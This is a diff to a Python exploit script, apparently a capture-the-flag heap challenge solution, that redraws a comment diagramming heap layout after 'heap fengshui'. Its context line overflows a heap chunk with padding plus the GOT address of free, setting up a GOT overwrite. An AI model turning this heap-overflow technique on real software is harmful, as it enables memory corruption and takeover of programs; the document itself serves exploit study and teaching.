@@ -110,12 +110,17 @@ if __name__ == "__main__":
     raw_input('after adding 1 item...')
 
     #
-    # Memory layout after heap fengshui
+    # Memory layout (heap fengshui)
     #
-    # [chunk 0-desc] [chunk 0-name] [chunk 3-desc] [chunk 2-desc] [chunk 2-name] [chunk 3-name]
-    #                                ------------------------------->      
-    #                                            we can overwrite the first 4 bytes of [chunk 2-name]
-    #                                            while satisfying (p + len_text < p2 - 4)                   
+    # [0-desc] [0-name] [1-desc] [1-name] [2-desc] [2-name]               
+    #
+    # [0-desc] [0-name]                   [2-desc] [2-name]               
+    #
+    # [0-desc] [0-name] [    3-desc     ] [2-desc] [2-name] [3-name]
+    #
+    #                    ----------------------------->      
+    #                        we can overwrite the first 4 bytes of [chunk 2-name]
+    #                        while satisfying (p + len_text < p2 - 4)           
     #
 
     update(3, 168+4, 'X'*168+p32(b.got['free'])) # now, we can bypass the check, and overflow the heap chunk
